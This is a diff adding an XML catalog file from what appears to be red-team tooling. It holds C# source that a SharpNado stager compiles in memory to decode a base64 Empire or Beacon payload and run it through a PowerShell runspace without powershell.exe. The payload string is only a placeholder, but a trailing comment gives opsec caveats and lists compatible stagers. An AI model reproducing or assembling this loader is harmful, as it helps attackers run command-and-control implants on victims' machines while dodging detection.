@@ -1,0 +1,46 @@
+﻿<?xml version="1.0" encoding="utf-8" ?>
+<catalog>
+  <payload id ="Source Code">
+    using System.Management.Automation;
+    using System.Management.Automation.Runspaces;
+    using System.Text;
+    using System;
+
+    namespace Catch
+    {
+    public class Me
+    {
+    public void Please()
+    {
+    string decode = Encoding.Unicode.GetString(Convert.FromBase64String("Base64 Empire or Beacon Payload Here"));
+    Runspace runSpace = RunspaceFactory.CreateRunspace();
+    runSpace.Open();
+    Pipeline pipeline = runSpace.CreatePipeline();
+    string script = decode;
+    pipeline.Commands.AddScript(script);
+    pipeline.Invoke();
+    }
+    }
+    }
+  </payload>
+  <CompileVersion id ="CompileVersion">CompilerVersion</CompileVersion>
+  <CompileVersion id ="CompileVersion">v4.0</CompileVersion>
+  <Namespace id ="Namespace">Catch</Namespace>
+  <Class id ="Class">Me</Class>
+  <Method id ="Method">Please</Method>
+  <Reference id ="Reference">System.dll</Reference>
+  <Reference id ="Reference">System.Management.Automation.dll</Reference>
+</catalog>
+
+<!-- Use this with stager that compiles source code in memory
+     Opsec Caveat - compilation files are temporarily written to disk and deleted
+     Stagers use System.CodeDom.Compiler
+     This compiles C# that runs no Powershell and would execute a powershell base64 Empire or Beacon payload but can be modified to run whatever
+     This is only for testing purposes
+     
+     Example stagers that were provided that this would work with are the following
+     
+     SharpNado_HTTP_WCF_SourceCompile
+     SharpNado_TCP_WCF_SourceCompile
+     SharpNado_TCP_Remoting_SourceCompile     
+     -->
